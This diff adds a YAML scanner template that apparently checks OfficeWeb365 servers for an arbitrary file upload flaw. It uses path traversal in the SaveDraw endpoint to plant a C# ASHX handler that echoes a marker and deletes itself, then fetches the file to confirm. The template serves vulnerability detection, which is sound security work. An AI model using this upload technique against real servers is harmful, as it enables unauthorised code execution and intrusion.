@@ -1,0 +1,43 @@
+name: poc-yaml-officeweb365-file-upload
+manual: true
+transport: http
+set:
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    randomHash: md5(s3)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /PW/SaveDraw?path=../../Content/img&idx={{s2}}.ashx
+            body: |-
+                data:image/png;base64,{{randomHash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
+                {
+                public void ProcessRequest(System.Web.HttpContext context)
+                {
+                System.Web.HttpResponse response = context.Response;
+                response.Write("{{s3}}");
+
+                string filePath = context.Server.MapPath("/") + context.Request.Path;
+                if (System.IO.File.Exists(filePath))
+                {
+                    System.IO.File.Delete(filePath);
+                }
+                }
+                public bool IsReusable
+                {
+                get { return false; }
+                }
+                }///---
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.startsWith("ok")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Content/img/UserDraw/drawPW{{s2}}.ashx
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(s3)
+expression: r0() && r1()
+detail: {}
